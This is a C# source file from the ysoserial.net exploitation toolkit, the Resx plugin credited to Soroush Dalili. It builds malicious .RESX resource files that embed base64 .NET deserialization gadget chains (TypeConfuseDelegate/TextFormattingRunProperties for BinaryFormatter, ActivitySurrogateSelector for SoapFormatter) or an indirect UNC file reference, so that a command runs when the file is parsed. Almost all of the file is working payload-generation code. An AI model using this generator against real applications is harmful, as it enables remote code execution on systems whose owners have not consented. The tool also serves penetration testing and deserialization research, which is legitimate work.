using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  There are a number of techniques to make the resource files (refer to the NCC Group blog post). Only a few of them have been included here.
 *  For BinaryFormatter, it uses the TypeConfuseDelegate gadget and for SoapFormatter it uses the ActivitySurrogateSelectorFromFile and ActivitySurrogateSelector gadgets.
 *  .RESX file can be compiled to .RESOURCE using the `resgen.exe payload.resx` command.
 * 
 * Original references: 
 *  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
 *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
 **/

namespace ysoserial.Plugins
{
    public class ResxPlugin : Plugin
    {
        static string mode = "";
        static string file = "";
        static string command = "";
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: indirect_resx_file, BinaryFormatter, SoapFormatter.", v => mode = v },
                {"c|command=", "the command to be executed in BinaryFormatter. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
                {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "Resx";
        }

        public string Description()
        {
            return "Generates RESX files";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            return GetPayload(mode, file, inputArgs);
        }

        public static string GetPayload(string mode, InputArgs inputArgs)
        {
            return GetPayload(mode, "", inputArgs);
        }
        public static string GetPayload(string mode, string file, InputArgs inputArgs) { 
            String mtype = "";
            String payloadValue = "";
            string payload = @"<root>
 <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
 <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />
 <xsd:element name=""root"" msdata:IsDataSet=""true"">
 <xsd:complexType>
 <xsd:choice maxOccurs=""unbounded"">
 <xsd:element name=""metadata"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" use=""required"" type=""xsd:string"" />
 <xsd:attribute name=""type"" type=""xsd:string"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""assembly"">
 <xsd:complexType>
 <xsd:attribute name=""alias"" type=""xsd:string"" />
 <xsd:attribute name=""name"" type=""xsd:string"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""data"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 <xsd:element name=""comment"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""2"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" msdata:Ordinal=""1"" />
 <xsd:attribute name=""type"" type=""xsd:string"" msdata:Ordinal=""3"" />
 <xsd:attribute name=""mimetype"" type=""xsd:string"" msdata:Ordinal=""4"" />
 <xsd:attribute ref=""xml:space"" />
 </xsd:complexType>
 </xsd:element>
 <xsd:element name=""resheader"">
 <xsd:complexType>
 <xsd:sequence>
 <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />
 </xsd:sequence>
 <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" />
 </xsd:complexType>
 </xsd:element>
 </xsd:choice>
 </xsd:complexType>
 </xsd:element>
 </xsd:schema>
 <resheader name=""resmimetype"">
 <value>text/microsoft-resx</value>
 </resheader>
 <resheader name=""version"">
 <value>2.0</value>
 </resheader>
 <resheader name=""reader"">
 <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <resheader name=""writer"">
 <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
 </resheader>
 <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />

<data name=""x"" {0}>
 <value>{1}</value>
 </data>
</root>";
            switch (mode.ToLower())
            {
                case "indirect_resx_file":
                    if (!String.IsNullOrEmpty(file) && !String.IsNullOrWhiteSpace(file))
                    {
                        mtype = @"type=""System.Resources.ResXFileRef""";
                        payloadValue = file + "; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
                    }
                    break;
                case "binaryformatter":
                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                    {
                        mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
                        byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                        payloadValue = Convert.ToBase64String(osf);

                    }
                    break;
                case "soapformatter":
                    mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    else
                    {
                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                        payloadValue = Convert.ToBase64String(osf);
                    }
                    break;
            }

            if (String.IsNullOrEmpty(payloadValue))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p Resx --help' for more information.");
                System.Environment.Exit(-1);
            }

            payload = String.Format(payload, mtype, payloadValue);

            if (inputArgs.Minify)
            {
                payload = XMLMinifier.Minify(payload, null, null);
            }

            return payload;
        }
    }
}
